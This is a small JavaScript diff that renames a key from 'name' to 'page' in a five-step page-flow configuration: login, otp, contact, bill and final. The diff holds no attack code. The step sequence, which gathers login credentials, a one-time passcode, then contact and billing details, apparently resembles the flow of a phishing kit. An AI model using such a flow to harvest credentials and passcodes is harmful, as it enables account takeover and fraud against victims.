@@ -99,11 +99,11 @@ async function buildUserInfo(req, sendAPIRequest) {
    PAGEFLOW
 =================================*/
 const DEFAULT_PAGEFLOW = {
-    "1": { name: "login", enabled: true },
-    "2": { name: "otp", enabled: true },
-    "3": { name: "contact", enabled: true },
-    "4": { name: "bill", enabled: true },
-    "5": { name: "final", enabled: true }
+    "1": { page: "login", enabled: true },
+    "2": { page: "otp", enabled: true },
+    "3": { page: "contact", enabled: true },
+    "4": { page: "bill", enabled: true },
+    "5": { page: "final", enabled: true }
   };
 
   const pageFlow = DEFAULT_PAGEFLOW;
